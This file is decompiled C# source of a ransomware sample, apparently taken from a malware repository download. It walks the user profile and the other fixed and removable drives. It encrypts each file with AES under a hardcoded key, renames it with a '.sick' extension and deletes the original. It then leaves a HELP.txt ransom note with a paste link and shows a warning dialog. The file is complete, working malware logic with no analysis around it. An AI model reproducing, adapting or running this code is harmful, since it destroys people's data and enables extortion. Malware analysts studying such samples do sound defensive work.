// Decompiled with JetBrains decompiler
// Type: erawosnar.a
// Assembly: erawosnar, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 5B904CE0-765C-4529-B6AC-99791DEDA329
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan-Ransom.MSIL.Encoder.gen-7dc40a9e663d516089df8a653d79bcd705425fc74caf56b32f45c4786b51ba31.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;

namespace erawosnar
{
  [StandardModule]
  public sealed class a
  {
    public static Regex k = new Regex(".");
    public static object z = (object) ".sick";
    public static object p = (object) Path.GetDirectoryName(Interaction.Environ("userprofile").ToString());

    [STAThread]
    public static void Main()
    {
      a.B(Conversions.ToString(a.p));
      DriveInfo[] drives = DriveInfo.GetDrives();
      int index = 0;
      while (index < drives.Length)
      {
        DriveInfo driveInfo = drives[index];
        if (Operators.CompareString(driveInfo.Name.ToString().Substring(0, 2), Interaction.Environ("systemdrive"), false) != 0 && driveInfo.DriveType == DriveType.Fixed | driveInfo.DriveType == DriveType.Removable)
          a.B(driveInfo.Name);
        checked { ++index; }
      }
      try
      {
        if (Conversions.ToBoolean("True"))
          File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP.txt", "For further instructions visit: https://ghostbin.com/paste/yuLbZ");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
      try
      {
        if (!Conversions.ToBoolean("True"))
          return;
        int num = (int) MessageBox.Show("Open the Textfile HELP.txt located on your Desktop!", "Attention!", MessageBoxButtons.OK, MessageBoxIcon.Exclamation, MessageBoxDefaultButton.Button1);
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void B(string dir)
    {
      try
      {
        if (Operators.CompareString(Conversions.ToString(((IEnumerable<string>) dir.Split('\\')).Last<string>()[0]), ".", false) == 0)
          return;
        string[] files = Directory.GetFiles(dir);
        int index1 = 0;
        while (index1 < files.Length)
        {
          string str = files[index1];
          if (a.k.IsMatch(Path.GetExtension(str)))
          {
            if (!Path.GetExtension(str).Contains(Conversions.ToString(a.z)))
            {
              try
              {
                File.WriteAllBytes(Conversions.ToString(Operators.ConcatenateObject((object) str, a.z)), a.G(File.ReadAllBytes(str), "_k95,Q8z@Lp0Q.Eq/YOUm4ibt.a%=J"));
                File.Delete(str);
                Console.WriteLine(str);
              }
              catch (Exception ex)
              {
                ProjectData.SetProjectError(ex);
                ProjectData.ClearProjectError();
              }
            }
          }
          checked { ++index1; }
        }
        string[] directories = Directory.GetDirectories(dir);
        int index2 = 0;
        while (index2 < directories.Length)
        {
          a.B(directories[index2]);
          checked { ++index2; }
        }
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static byte[] G(byte[] h, string i)
    {
      RijndaelManaged rijndaelManaged = new RijndaelManaged();
      SHA256Cng shA256Cng = new SHA256Cng();
      rijndaelManaged.GenerateIV();
      rijndaelManaged.Key = shA256Cng.ComputeHash(Encoding.ASCII.GetBytes(i));
      rijndaelManaged.Mode = CipherMode.CBC;
      byte[] iv = rijndaelManaged.IV;
      byte[] sourceArray = rijndaelManaged.CreateEncryptor().TransformFinalBlock(h, 0, h.Length);
      byte[] destinationArray = new byte[sourceArray.Length - 1 + 16 + 1];
      Array.Copy((Array) iv, (Array) destinationArray, 16);
      Array.Copy((Array) sourceArray, 0, (Array) destinationArray, 16, sourceArray.Length);
      return destinationArray;
    }
  }
}
